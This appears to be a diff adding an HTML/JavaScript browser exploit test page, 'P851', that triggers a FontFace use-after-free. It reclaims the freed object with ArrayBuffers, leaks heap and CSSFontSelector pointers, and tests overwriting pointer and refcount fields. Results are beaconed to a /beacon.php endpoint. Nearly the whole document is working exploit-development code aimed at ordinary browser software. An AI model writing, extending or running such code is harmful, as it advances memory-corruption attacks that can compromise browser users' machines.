@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P851</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P851: Q13 Redirect + Zero-AB Writeback</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P851-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+
+bn('BOOT','start');
+log('Q13 redirect + zero-AB writeback definitive test','info');
+log('','');
+
+/* ===================================================================
+   PHASE A: FontFace UAF baseline (proven pattern)
+   =================================================================== */
+var hitAB=null, BU=null;
+var mainH=BigInt(0), mainQ13=BigInt(0);
+var baseline=new Array(24);
+
+var stM=document.createElement('style');
+stM.textContent="@font-face{font-family:bbM;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stM);
+var faceM=new FontFace('fM',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(faceM);
+void faceM.loaded;
+var mFired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(mFired)return undefined;
+    mFired=true;
+    if(stM){stM.remove();stM.textContent='';stM=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    var mABs=[];
+    for(var i=0;i<80;i++)mABs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bbM');}catch(e){}
+    document.body.offsetHeight;
+    window.__mABs=mABs;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em fM, bbM','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  var mABs=window.__mABs||[];
+  for(var i=0;i<mABs.length;i++){
+    var bu=new BigUint64Array(mABs[i]);
+    for(var j=0;j<bu.length;j++){
+      if(bu[j]!==BigInt(0)){
+        hitAB=mABs[i]; BU=bu;
+        mainH=bu[11]-BigInt(0x68);
+        mainQ13=bu[13];
+        for(var k=0;k<24;k++)baseline[k]=bu[k];
+        break;
+      }
+    }
+    if(hitAB)break;
+  }
+
+  if(!hitAB){
+    log('Phase A: MISS','fail');
+    bn('A-MISS','no-hit');
+    bn('DONE','early-exit');
+    return;
+  }
+
+  log('Phase A HIT:','ok');
+  log('  H  = '+hexQ(mainH),'ok');
+  log('  q13= '+hexQ(mainQ13)+' (CSSFontSelector*)','ok');
+
+  /* Dump all nonzero baseline qwords */
+  var blDump=[];
+  for(var i=0;i<24;i++){
+    if(baseline[i]!==BigInt(0))blDump.push('q'+i+'='+hexQ(baseline[i]));
+  }
+  log('  Baseline: '+blDump.join(', '),'info');
+  bn('A-HIT','H='+hexQ(mainH)+'|q13='+hexQ(mainQ13)+'|nz='+blDump.length);
+
+  runTests();
+},300);
+
+function restore(){for(var i=0;i<24;i++)BU[i]=baseline[i];}
+function zeroAll(){for(var i=0;i<24;i++)BU[i]=BigInt(0);}
+function diffBaseline(){
+  var d=0;
+  for(var i=0;i<24;i++)if(BU[i]!==baseline[i])d++;
+  return d;
+}
+function diffZero(){
+  var d=0, dq=[];
+  for(var i=0;i<24;i++){
+    if(BU[i]!==BigInt(0)){d++;dq.push('q'+i+'='+hexQ(BU[i]));}
+  }
+  return {count:d, detail:dq.join('|')};
+}
+
+function runTests(){
+  log('','');
+
+  /* ===================================================================
+     TEST 1: ZERO entire AB → fonts.check() → what comes back?
+     DEFINITIVE: does fonts.check() WRITE to the freed CSSFontFace?
+     =================================================================== */
+  log('--- TEST 1: Zero ALL → fonts.check() → writeback? ---','hot');
+  zeroAll();
+  try{document.fonts.check('1em bbM');}catch(e){}
+  var t1=diffZero();
+  log('  After fonts.check on zeroed AB: '+t1.count+' nonzero qwords','info');
+  if(t1.count>0){
+    log('  *** fonts.check() WRITES to freed memory! ***','hot');
+    log('  '+t1.detail,'hot');
+  } else {
+    log('  fonts.check() writes NOTHING — data is residual','fail');
+  }
+  bn('T1',t1.count+'nz|'+t1.detail.slice(0,500));
+
+  /* ===================================================================
+     TEST 2: Zero ALL → face.load() → what comes back?
+     =================================================================== */
+  log('','');
+  log('--- TEST 2: Zero ALL → face.load() → writeback? ---','hot');
+  zeroAll();
+  try{faceM.load();}catch(e){}
+  /* face.load is async — check immediately (sync write) + after delay */
+  var t2a=diffZero();
+  log('  Sync after face.load(): '+t2a.count+' nonzero','info');
+  bn('T2-SYNC',t2a.count+'nz|'+t2a.detail.slice(0,400));
+
+  setTimeout(function(){
+    var t2b=diffZero();
+    log('  100ms after face.load(): '+t2b.count+' nonzero','info');
+    if(t2b.count>0)log('  '+t2b.detail,'hot');
+    bn('T2-ASYNC',t2b.count+'nz|'+t2b.detail.slice(0,400));
+
+    /* ===================================================================
+       TEST 3: Zero ALL → document.fonts.forEach → writeback?
+       =================================================================== */
+    log('','');
+    log('--- TEST 3: Zero ALL → fonts.forEach → writeback? ---','hot');
+    zeroAll();
+    var feCnt=0;
+    try{document.fonts.forEach(function(f){feCnt++;});}catch(e){}
+    var t3=diffZero();
+    log('  forEach iterated '+feCnt+' faces, '+t3.count+' nonzero','info');
+    if(t3.count>0)log('  '+t3.detail,'hot');
+    bn('T3',feCnt+'faces|'+t3.count+'nz|'+t3.detail.slice(0,400));
+
+    /* ===================================================================
+       TEST 4: Restore baseline → set q13=H → fonts.check → diff
+       Does the font system follow q13 to read from H?
+       =================================================================== */
+    log('','');
+    log('--- TEST 4: q13 → H (heap), fonts.check → diff ---','hot');
+    restore();
+    BU[13]=mainH; /* q13 now points to H instead of CSSFontSelector */
+    try{document.fonts.check('1em bbM');}catch(e){}
+    var t4=diffBaseline();
+    log('  q13=H diff from baseline: '+t4,'info');
+    /* Check if any NEW data appeared */
+    var t4new=[];
+    for(var i=0;i<24;i++){
+      if(BU[i]!==baseline[i] && i!==13){
+        t4new.push('q'+i+'='+hexQ(BU[i]));
+      }
+    }
+    if(t4new.length>0){
+      log('  *** NEW DATA from q13 redirect! ***','hot');
+      log('  '+t4new.join(', '),'hot');
+    } else {
+      log('  No new data (q13 not followed)','fail');
+    }
+    bn('T4','d'+t4+'|new='+t4new.join('|'));
+
+    /* ===================================================================
+       TEST 5: Restore → set q13=0 → fonts.check → crash test
+       If fonts.check dereferences q13, this should crash.
+       If it doesn't crash, q13 is NOT dereferenced.
+       =================================================================== */
+    log('','');
+    log('--- TEST 5: q13 → 0 (null), fonts.check → crash test ---','hot');
+    restore();
+    BU[13]=BigInt(0); /* q13 = null */
+    var t5ok=true;
+    try{document.fonts.check('1em bbM');}catch(e){t5ok=false;}
+    var t5=diffBaseline();
+    log('  q13=null survived: '+t5ok+', diff='+t5,'info');
+    bn('T5','ok='+t5ok+'|d='+t5);
+
+    /* ===================================================================
+       TEST 6: Restore → set q0 (refcount)=0 → fonts.check
+       If refcount matters, setting it to 0 might cause free/crash
+       =================================================================== */
+    log('','');
+    log('--- TEST 6: q0 (refcount)=0 → fonts.check ---','hot');
+    restore();
+    BU[0]=BigInt(0); /* refcount = 0 */
+    var t6ok=true;
+    try{document.fonts.check('1em bbM');}catch(e){t6ok=false;}
+    var t6=diffBaseline();
+    var t6rc=BU[0]; /* did refcount change? */
+    log('  refcount=0 survived: '+t6ok+', q0 now='+hexQ(t6rc)+', diff='+t6,'info');
+    bn('T6','ok='+t6ok+'|q0='+hexQ(t6rc)+'|d='+t6);
+
+    /* ===================================================================
+       TEST 7: AudioContext availability
+       =================================================================== */
+    log('','');
+    log('--- TEST 7: AudioContext availability ---','hot');
+    var acOk=false, acType='none';
+    try{
+      var ac=new (window.AudioContext||window.webkitAudioContext)();
+      acOk=true;
+      acType=ac.constructor.name||'AudioContext';
+      log('  AudioContext: YES ('+acType+', state='+ac.state+', rate='+ac.sampleRate+')','ok');
+      /* Create nodes to see what's available */
+      var nodeTests=['createOscillator','createGain','createAnalyser','createBiquadFilter',
+        'createBuffer','createBufferSource','createDelay','createDynamicsCompressor',
+        'createConvolver','createPanner','createStereoPanner','createWaveShaper',
+        'createPeriodicWave','createScriptProcessor','createMediaElementSource'];
+      var available=[];
+      for(var ni=0;ni<nodeTests.length;ni++){
+        try{
+          if(typeof ac[nodeTests[ni]]==='function')available.push(nodeTests[ni].replace('create',''));
+        }catch(e){}
+      }
+      log('  Nodes: '+available.join(', '),'info');
+      bn('T7','YES|state='+ac.state+'|rate='+ac.sampleRate+'|nodes='+available.join(','));
+      try{ac.close();}catch(e){}
+    }catch(e){
+      log('  AudioContext: NO ('+e.message+')','fail');
+      bn('T7','NO|'+e.message);
+    }
+
+    /* ===================================================================
+       TEST 8: CSS computed style leak test
+       Can getComputedStyle on a font-using element reveal anything?
+       =================================================================== */
+    log('','');
+    log('--- TEST 8: Computed style + font-family resolved ---','hot');
+    var testEl=document.createElement('div');
+    testEl.style.cssText='font-family:bbM,serif;font-size:16px;visibility:hidden;';
+    testEl.textContent='Test';
+    document.body.appendChild(testEl);
+    var cs=getComputedStyle(testEl);
+    var csFont=cs.fontFamily||'';
+    var csFontSize=cs.fontSize||'';
+    log('  font-family: "'+csFont+'"','info');
+    log('  font-size: "'+csFontSize+'"','info');
+    /* Check for any hex-like values in computed style */
+    var hexFound=[];
+    var props=['font','fontFamily','fontFeatureSettings','fontVariationSettings',
+      'fontKerning','fontOpticalSizing','fontSizeAdjust','fontStretch',
+      'fontSynthesis','fontVariantCaps','lineHeight','letterSpacing'];
+    for(var pi=0;pi<props.length;pi++){
+      var val=cs[props[pi]]||'';
+      if(val.match(/0x[0-9a-f]/i))hexFound.push(props[pi]+'='+val);
+    }
+    if(hexFound.length>0){
+      log('  HEX in computed style: '+hexFound.join(', '),'hot');
+    }
+    testEl.remove();
+    bn('T8','font='+csFont+'|hex='+hexFound.length);
+
+    /* ===================================================================
+       TEST 9: Zero ALL → multiple fonts.check with different families
+       Maybe different families access different CSSFontFace fields
+       =================================================================== */
+    log('','');
+    log('--- TEST 9: Zero ALL → 5x fonts.check variants ---','hot');
+    var t9results=[];
+    var families=['bbM','fM','serif','sans-serif','monospace'];
+    for(var fi=0;fi<families.length;fi++){
+      zeroAll();
+      try{document.fonts.check('1em '+families[fi]);}catch(e){}
+      var r=diffZero();
+      t9results.push(families[fi]+'='+r.count);
+      if(r.count>0)log('  "'+families[fi]+'": '+r.count+' writes: '+r.detail,'hot');
+    }
+    log('  Summary: '+t9results.join(', '),'info');
+    bn('T9',t9results.join('|'));
+
+    /* Restore baseline for safety */
+    restore();
+
+    log('','');
+    log('====== P851 COMPLETE ======','hot');
+    bn('DONE','complete');
+  },150);
+}
+</script></body></html>
